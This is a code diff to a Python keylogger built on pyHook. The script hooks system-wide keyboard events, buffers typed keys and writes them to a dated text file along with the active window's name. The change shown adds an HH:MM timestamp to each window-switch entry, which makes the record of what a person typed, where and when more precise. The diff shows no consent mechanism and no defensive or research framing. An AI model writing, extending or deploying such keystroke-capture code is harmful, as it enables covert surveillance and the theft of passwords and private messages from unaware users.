@@ -1,5 +1,6 @@
 import pyHook, pythoncom, sys, logging
 from datetime import datetime
+from time import time
 
 todays_date = datetime.now().strftime('%Y-%b-%d')
 file_name =  'test #' + todays_date + '.txt'
@@ -22,8 +23,9 @@ def OnKeyboardEvent(event):
             line_buffer += '\n'
             SaveLineToFile(line_buffer)
 
+        current_time = datetime.now().time().strftime('%H:%M')
         line_buffer = ""
-        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n')
+        SaveLineToFile('\n'+ current_time + '-----WindowName: ' + event.WindowName + '\n')
         window_name = event.WindowName
 
     """if return or tab key pressed"""
